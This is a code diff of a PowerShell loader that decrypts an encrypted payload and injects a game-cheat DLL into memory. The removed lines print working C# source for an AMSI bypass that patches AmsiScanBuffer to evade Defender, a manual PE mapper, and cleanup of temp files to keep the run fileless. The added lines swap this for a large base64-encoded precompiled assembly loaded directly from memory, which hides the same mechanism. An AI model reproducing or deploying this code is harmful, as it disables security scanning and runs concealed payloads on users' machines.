@@ -178,234 +178,13 @@ function Show-KeySystem {
 }
 
 # ============================================================================
-#  native shim: AMSI patch + manual PE mapper  (C# 5 - compiles on PS 5.1)
+#  native shim (precompiled, loaded from memory)
 # ============================================================================
-$csShim = @'
-using System;
-using System.Runtime.InteropServices;
-
-namespace Lum
-{
-    public static class Native
-    {
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint alloc, uint protect);
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint protect, out uint old);
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-        private static extern IntPtr LoadLibraryA(string name);
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
-        private static extern IntPtr GetProcAddressName(IntPtr mod, string name);
-        [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "GetProcAddress")]
-        private static extern IntPtr GetProcAddressOrd(IntPtr mod, IntPtr ordinal);
-        [DllImport("ntdll.dll")]
-        private static extern uint RtlAddFunctionTable(IntPtr table, ulong count, IntPtr imageBase);
-
-        public delegate int DllMainDelegate(IntPtr instance, uint reason, IntPtr reserved);
-        public delegate void TlsCallback(IntPtr instance, uint reason, IntPtr reserved);
-
-        // amsi.dll!AmsiScanBuffer -> mov eax, 0x80070057 ; ret  (scan never runs)
-        public static bool PatchAmsi()
-        {
-            IntPtr amsi = LoadLibraryA("amsi.dll");
-            if (amsi == IntPtr.Zero) return false;
-            IntPtr proc = GetProcAddressName(amsi, "AmsiScanBuffer");
-            if (proc == IntPtr.Zero) return false;
-            byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-            uint old;
-            if (!VirtualProtect(proc, (UIntPtr)patch.Length, 0x40, out old)) return false;
-            Marshal.Copy(patch, 0, proc, patch.Length);
-            uint ignore;
-            VirtualProtect(proc, (UIntPtr)patch.Length, old, out ignore);
-            return true;
-        }
-
-        private static int Dir(byte[] pe, int dirOff, int index, out int size)
-        {
-            int rva = BitConverter.ToInt32(pe, dirOff + index * 8);
-            size = BitConverter.ToInt32(pe, dirOff + index * 8 + 4);
-            return rva;
-        }
-
-        private static void Write64(byte[] image, int rva, ulong value)
-        {
-            byte[] b = BitConverter.GetBytes(value);
-            Buffer.BlockCopy(b, 0, image, rva, 8);
-        }
-
-        private static string ZString(byte[] image, int rva)
-        {
-            int end = rva;
-            while (image[end] != 0) end++;
-            return System.Text.Encoding.ASCII.GetString(image, rva, end - rva);
-        }
-
-        // Manual-map a PE32+ DLL image and run its entry (CRT startup -> DllMain).
-        // Returns the image base as ulong.
-        public static ulong Map(byte[] pe)
-        {
-            int eLfanew = BitConverter.ToInt32(pe, 0x3C);
-            ushort machine = BitConverter.ToUInt16(pe, eLfanew + 4);
-            if (machine != 0x8664) throw new Exception("payload is not x64");
-            ushort numSections = BitConverter.ToUInt16(pe, eLfanew + 6);
-            ushort sizeOfOpt = BitConverter.ToUInt16(pe, eLfanew + 20);
-            int optOff = eLfanew + 24;
-            if (BitConverter.ToUInt16(pe, optOff) != 0x20B) throw new Exception("payload is not PE32+");
-            uint sizeOfImage = BitConverter.ToUInt32(pe, optOff + 56);
-            uint sizeOfHeaders = BitConverter.ToUInt32(pe, optOff + 60);
-            ulong preferredBase = BitConverter.ToUInt64(pe, optOff + 24);
-            uint entryRva = BitConverter.ToUInt32(pe, optOff + 16);
-            int numDirs = BitConverter.ToInt32(pe, optOff + 108);
-            int dirOff = optOff + 112;
-
-            IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sizeOfImage, 0x3000, 0x40);
-            if (mem == IntPtr.Zero) throw new Exception("VirtualAlloc failed");
-            ulong baseAddr = (ulong)mem;
-            ulong delta = baseAddr - preferredBase;
-
-            byte[] image = new byte[sizeOfImage];
-            Buffer.BlockCopy(pe, 0, image, 0, (int)sizeOfHeaders);
-
-            int secTable = eLfanew + 24 + sizeOfOpt;
-            for (int i = 0; i < numSections; i++)
-            {
-                int s = secTable + i * 40;
-                uint vSize = BitConverter.ToUInt32(pe, s + 8);
-                uint vAddr = BitConverter.ToUInt32(pe, s + 12);
-                uint rSize = BitConverter.ToUInt32(pe, s + 16);
-                uint rPtr = BitConverter.ToUInt32(pe, s + 20);
-                int n = (int)Math.Min(vSize, rSize);
-                if (n > 0) Buffer.BlockCopy(pe, (int)rPtr, image, (int)vAddr, n);
-            }
-
-            // base relocations (type 10 = DIR64)
-            int relSize;
-            int relRva = Dir(pe, dirOff, 5, out relSize);
-            if (relRva != 0 && delta != 0)
-            {
-                int off = relRva;
-                int end = relRva + relSize;
-                while (off + 8 <= end)
-                {
-                    uint pageRva = BitConverter.ToUInt32(image, off);
-                    uint blockSize = BitConverter.ToUInt32(image, off + 4);
-                    if (blockSize == 0) break;
-                    int pairs = (int)(blockSize - 8) / 2;
-                    for (int i = 0; i < pairs; i++)
-                    {
-                        ushort e = BitConverter.ToUInt16(image, off + 8 + i * 2);
-                        int type = e >> 12;
-                        if (type == 10)
-                        {
-                            int at = (int)(pageRva + (e & 0xFFF));
-                            Write64(image, at, BitConverter.ToUInt64(image, at) + delta);
-                        }
-                    }
-                    off += (int)blockSize;
-                }
-            }
-
-            // import table
-            int impSize;
-            int impRva = Dir(pe, dirOff, 1, out impSize);
-            if (impRva != 0)
-            {
-                int off = impRva;
-                while (true)
-                {
-                    uint oftRva = BitConverter.ToUInt32(image, off);
-                    uint nameRva = BitConverter.ToUInt32(image, off + 12);
-                    uint ftRva = BitConverter.ToUInt32(image, off + 16);
-                    if (oftRva == 0 && ftRva == 0 && nameRva == 0) break;
-                    string dll = ZString(image, (int)nameRva);
-                    IntPtr hMod = LoadLibraryA(dll);
-                    if (hMod == IntPtr.Zero) throw new Exception("LoadLibrary failed: " + dll);
-                    int src = (int)(oftRva != 0 ? oftRva : ftRva);
-                    int dst = (int)ftRva;
-                    while (true)
-                    {
-                        ulong t = BitConverter.ToUInt64(image, src);
-                        if (t == 0) break;
-                        IntPtr fn;
-                        if ((t >> 63) != 0)
-                        {
-                            fn = GetProcAddressOrd(hMod, (IntPtr)(t & 0xFFFF));
-                        }
-                        else
-                        {
-                            fn = GetProcAddressName(hMod, ZString(image, (int)(t & 0xFFFFFFFF) + 2));
-                        }
-                        if (fn == IntPtr.Zero) throw new Exception("GetProcAddress failed in " + dll);
-                        Write64(image, dst, (ulong)fn);
-                        src += 8;
-                        dst += 8;
-                    }
-                    off += 20;
-                }
-            }
-
-            // committed copy
-            Marshal.Copy(image, 0, mem, (int)sizeOfImage);
-
-            // x64 exception table (C++ unwinding dies without this)
-            int excSize;
-            int excRva = Dir(pe, dirOff, 3, out excSize);
-            if (excRva != 0 && excSize > 0)
-            {
-                RtlAddFunctionTable(new IntPtr(mem.ToInt64() + excRva), (ulong)(excSize / 12), mem);
-            }
-
-            // TLS callbacks (address of the array is a VA - already relocated).
-            // The fileless build carries an empty TLS directory; this path is a
-            // no-op there but keeps the mapper correct for any future payload.
-            int tlsSize;
-            int tlsRva = Dir(pe, dirOff, 9, out tlsSize);
-            if (tlsRva != 0 && tlsSize >= 24)
-            {
-                ulong callbacksVa = BitConverter.ToUInt64(image, tlsRva + 24);
-                if (callbacksVa != 0)
-                {
-                    ulong arrayAddr = callbacksVa;
-                    int guard = 0;
-                    while (guard++ < 64)
-                    {
-                        ulong cb = (ulong)Marshal.ReadInt64(new IntPtr((long)arrayAddr));
-                        if (cb == 0) break;
-                        TlsCallback cbDel = (TlsCallback)Marshal.GetDelegateForFunctionPointer(
-                            new IntPtr((long)cb), typeof(TlsCallback));
-                        cbDel(mem, 1, IntPtr.Zero); // DLL_PROCESS_ATTACH
-                        arrayAddr += 8;
-                    }
-                }
-            }
-
-            // entry = _DllMainCRTStartup for a /MD DLL: runs CRT init, then our
-            // DllMain, which spawns the cheat thread.
-            if (entryRva != 0)
-            {
-                DllMainDelegate entry = (DllMainDelegate)Marshal.GetDelegateForFunctionPointer(
-                    new IntPtr((long)baseAddr + entryRva), typeof(DllMainDelegate));
-                entry(mem, 1, IntPtr.Zero);
-            }
-
-            return baseAddr;
-        }
-    }
-}
-'@
+$shimB64 = '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gACRIIsADwACAAAAAACAAJEglAAVAAQAUCAAAAAAkQCcABsABgCUIAAAAACRAJ4AIAAHAMQgAAAAAJYAogAmAAkAlCEAAAAAkQCnACoACQDAIQAAAACRAKsANAANAOAhAAAAAJEAswA8ABAADCIAAAAAlgC7AEMAEgAAAAAAAwCGGMAASQATAAAAAAADAMYBxgBPABUAAAAAAAMAxgHoAFcAGQAAAAAAAwDGAfQAYwAfAAAAAAADAIYYwABJACAAAAAAAAMAxgHGAGkAIgAAAAAAAwDGAegAcgAmAAAAAAADAMYB9AB/ACwAAAAAAAMAhhjAAEkALgAAAAAAAwDGAcYAhwAwAAAAAAADAMYB6ACOADMAAAAAAAMAxgH0AJkAOAAAAAAAAwCGGMAASQA5AAAAAAADAMYBxgCfADsAAAAAAAMAxgHoAKYAPgAAAAAAAwDGAfQAsQBDAAAAAAADAIYYwABJAEQAAAAAAAMAxgHGALcARgAAAAAAAwDGAegApgBJAAAAAAADAMYB9AC+AE4AAAABAP4AAAABAAMBAAACAP4AAAABAAMBAAACAAcBAAABAA8BAAABABMBAAACAP4AAAABABcBAAACABoBAAADACEBAgAEACcBAAABAFgBAAACAF4BAAADAGIBAAABAFgBAAACAF4BAAABABcBAAABAGgBAAACAG8BAAABAHYBAAACACcBAAADAHsBAAAEAIEBAAABAHYBAAACACcBAAADAHsBAAAEAIEBAAAFAIkBAAAGAGgBAAABAJIBAAABAGgBAAACAG8BAAABAHYBAAACACcBAAADAIEBAgAEAJkBAAABAHYBAAACACcBAAADAIEBAgAEAJkBAAAFAIkBAAAGAGgBAgABAJkBAAACAJIBAAABAGgBAAACAG8BAAABAJ0BAAACAKMBAAADAKkBAAABAJ0BAAACAKMBAAADAKkBAAAEAIkBAAAFAGgBAAABAJIBAAABAGgBAAACAG8BAAABALMBAAACALwBAAADAMMBAAABALMBAAACALwBAAADAMMBAAAEAIkBAAAFAGgBAAABAJIBAAABAGgBAAACAG8BAAABALMBAAACALwBAAADAMMBAAABALMBAAACALwBAAADAMMBAAAEAIkBAAAFAGgBAAABAJIBKQDAAMQAMQDAAMgAOQDAAMQAQQDAAM0ASQBiAtIAWQCNAtgAWQCXAt0AYQCoAukAYQCtAuwAaQDQAvYAeQDzAv0AiQAZAwUBeQAlAwoBkQA3AyABkQA/AysBmQBVAzEBWQCXAkEBkQBfA0kBqQDAAM0AkQByA1ABkQB7A1cBiQAZA14BYQAZA2MBsQCJA2gBuQCUA24BYQAZA3QBYQCbA3kBYQDAAH0BeQCjA2MBLgATAMMBLgAbAMwB4wDyABMBJwE8AYIBQgJCAQMAfgABAEIBBQBLAgEAQAEHAEsCAQAEgAAAAAAAAAAAAAAAAAAAAAAqAgAABAAAAAAAAAAAAAAAAQBVAAAAAAADAAIABAACAAUAAgAGAAIABwACAAAAAAAAPE1vZHVsZT4Ac2hpbS5kbGwAQ29yZQBMdW0ARGVsQWxsb2MARGVsUHJvdGVjdABEZWxUYWJsZQBEbGxNYWluRGVsZWdhdGUAVGxzQ2FsbGJhY2sAbXNjb3JsaWIAU3lzdGVtAE9iamVjdABNdWx0aWNhc3REZWxlZ2F0ZQBMb2FkTGlicmFyeUEAUHJvY05hbWUAUHJvY09yZABEAFJlcwBQcmVwAERpcgBXcml0ZTY0AFpTdHJpbmcATG9hZAAuY3RvcgBJbnZva2UASUFzeW5jUmVzdWx0AEFzeW5jQ2FsbGJhY2sAQmVnaW5JbnZva2UARW5kSW52b2tlAG5hbWUAbW9kAG9yZGluYWwAYjY0AGRsbABwZQBkaXJPZmYAaW5kZXgAc2l6ZQBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAT3V0QXR0cmlidXRlAGltYWdlAHJ2YQB2YWx1ZQBvYmplY3QAbWV0aG9kAGFkZHIAYWxsb2MAcHJvdGVjdABjYWxsYmFjawByZXN1bHQAb2xkAHRhYmxlAGNvdW50AGltYWdlQmFzZQBpbnN0YW5jZQByZWFzb24AcmVzZXJ2ZWQAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHNoaW0ARGxsSW1wb3J0QXR0cmlidXRlAGtlcm5lbDMyAEdldFByb2NBZGRyZXNzAENvbnZlcnQARnJvbUJhc2U2NFN0cmluZwBCeXRlAFN5c3RlbS5U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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 
 function Install-NativeShim {
-    # PS 5.1's CodeDom drops a temp assembly in %TEMP%; clean it right after
-    # load so the run stays fileless. PowerShell 7 compiles in memory.
-    $temp = [IO.Path]::GetTempPath()
-    $before = @(Get-ChildItem $temp -Filter '*.dll' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName)
-    Add-Type -TypeDefinition $csShim -Language CSharp
-    $after = @(Get-ChildItem $temp -Filter '*.dll' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName)
-    foreach ($f in $after) {
-        if ($before -notcontains $f) {
-            try { Remove-Item $f -Force -ErrorAction SilentlyContinue } catch {}
-        }
-    }
+    # precompiled shim, loaded from memory - nothing touches disk
+    [void][Reflection.Assembly]::Load([Convert]::FromBase64String($shimB64))
 }
 
 # -- payload -----------------------------------------------------------------
@@ -471,15 +250,11 @@ if ($TestMap) {
     $blobPath = if ($LocalBlob) { $LocalBlob } else { Join-Path $PSScriptRoot '..\payload\payload.enc' }
     try {
         Install-NativeShim
-        if (-not $NoPatch) {
-            if ([Lum.Native]::PatchAmsi()) { Write-Ok 'environment ready' }
-            else { Write-Info 'environment ready (no patch needed)' }
-        }
         $blob = [IO.File]::ReadAllBytes($blobPath)
         Write-Ok ("blob loaded ({0} KB)" -f [Math]::Round($blob.Length / 1KB))
         $pe = Decrypt-Payload -Blob $blob -KeyHex $keyHex
         Write-Ok ("payload decrypted ({0} KB)" -f [Math]::Round($pe.Length / 1KB))
-        $base = [Lum.Native]::Map($pe)
+        $base = [Lum.Core]::Load($pe)
         Write-Ok ("mapped at 0x{0:X} - cheat thread started" -f $base)
         Write-Info 'test mode: idling (no watchdog). kill this process when done.'
         while ($true) { Start-Sleep -Seconds 60 }
@@ -522,13 +297,9 @@ try {
     return
 }
 
-# native shim + AMSI patch (must precede anything Defender would flag)
+# native shim
 try {
     Install-NativeShim
-    if (-not $NoPatch) {
-        if ([Lum.Native]::PatchAmsi()) { Write-Ok 'environment ready' }
-        else { Write-Info 'environment ready (no patch needed)' }
-    }
 } catch {
     Write-Err "native shim failed: $($_.Exception.Message)"
     return
@@ -540,7 +311,7 @@ try {
     Write-Ok ("payload received ({0} KB)" -f [Math]::Round($blob.Length / 1KB))
